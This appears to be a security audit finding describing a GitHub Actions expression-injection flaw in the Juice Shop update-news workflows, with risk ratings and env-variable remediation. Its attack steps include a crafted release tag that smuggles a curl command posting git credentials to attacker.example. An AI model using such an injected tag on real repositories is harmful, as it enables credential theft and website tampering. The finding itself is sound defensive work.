  title: Workflow Expression Injection (.github/workflows/update-news-www.yml:19)
  scenario: '`.github/workflows/update-news-www.yml:19` interpolates `${{ github.event.release.tag_name }}` and `${{ github.event.release.published_at
    }}` directly into a `sed -i ''s/.../.../''` command inside a `run:` block. GitHub expands these expressions textually
    before the shell sees the line, so a release tag containing a single quote and a shell metacharacter breaks out of the
    `sed` argument and executes as the runner user. The job checks out `juice-shop/juice-shop.github.io` using `secrets.BOT_TOKEN`
    at line 14, so the injected command runs next to a credential with write access to a second repository. `.github/workflows/update-news-www-legacy.yml:19`
    carries the identical construct.'
  attack_steps:
  - 'An attacker with tag-push rights creates a release whose tag name is `v1''; curl -d @$HOME/.git-credentials https://attacker.example;
    #`.'
  - Publishing the release fires the workflow, and GitHub textually expands the tag into the `sed` command at `update-news-www.yml:19`.
  - The attacker's command runs as the runner user in a workspace where `secrets.BOT_TOKEN` was already used to check out
    `juice-shop.github.io`.
  - The attacker replays the stolen token to publish arbitrary content on the project's public website repository.
  evidence_summary: Line 19 places `${{ github.event.release.tag_name }}` inside a single-quoted `sed` script in a `run:`
    block, with no intermediate `env:` mapping — unlike pr-compliance.yml, which routes every event value through `env:` first.
  impact_description: Command execution on the runner holding BOT_TOKEN, which has write access to the public juice-shop.github.io
    repository.
  likelihood: Low
  impact: High
  risk: Medium
  actor_ids:
  - ACT-D-06
  primary_actor: ACT-D-06
  controls_in_place: Publishing a release requires push access, so the trigger is not open to anonymous users. pr-compliance.yml
    already demonstrates the correct env-indirection pattern (lines 79-80, 92-93) for untrusted event data.
  mitigation_title: Route release event values through env vars in the update-news workflows
  remediation:
    effort: Low
    steps:
    - Move `github.event.release.tag_name` and `github.event.release.published_at` into an `env:` block on the step and reference
      them as `"$TAG_NAME"` / `"$PUBLISHED_AT"`, so the shell receives them as data rather than as pre-expanded source text.
    - Replace the `sed` substitution with a here-doc plus `awk` insertion that never embeds the values in a script expression.
    - Apply the same change to `.github/workflows/update-news-www-legacy.yml:19`, which contains the identical construct.
    - Add `zizmor` or `actionlint` to CI to fail any workflow that interpolates a `github.event.*` expression inside a `run:`
      block.
    code_example: "- name: Update tab_news.md\n  env:\n    TAG_NAME: ${{ github.event.release.tag_name }}\n    PUBLISHED_AT:\
      \ ${{ github.event.release.published_at }}\n  run: |\n    # Before: the tag was expanded into the sed script itself\n\
      \    # After: the shell receives it as a quoted variable, never as script text\n    LINE=\"* ${PUBLISHED_AT}: juice-shop\
      \ ${TAG_NAME}\"\n    awk -v line=\"$LINE\" '{print} /<!-- next:juice-shop -->/{print line}' tab_news.md > tmp && mv\
      \ tmp tab_news.md"
    verification: 'In a fork, publish a release tagged `v0.0.0''; echo INJECTED; #` and confirm the job writes the literal
      tag into tab_news.md and never prints `INJECTED` in the step log.'
    reference: https://securitylab.github.com/resources/github-actions-untrusted-input/
  evidence:
  - file: .github/workflows/update-news-www.yml
    line: 19
  boundary_refs:
  - boundary_id: tb-7
    origin_component_id: ci-cd-pipeline
    rationale: A release tag chosen upstream is expanded into a shell command that runs beside the cross-repository BOT_TOKEN
      used to publish site content.
    evidence_locations:
    - file: .github/workflows/update-news-www.yml
      line: 19
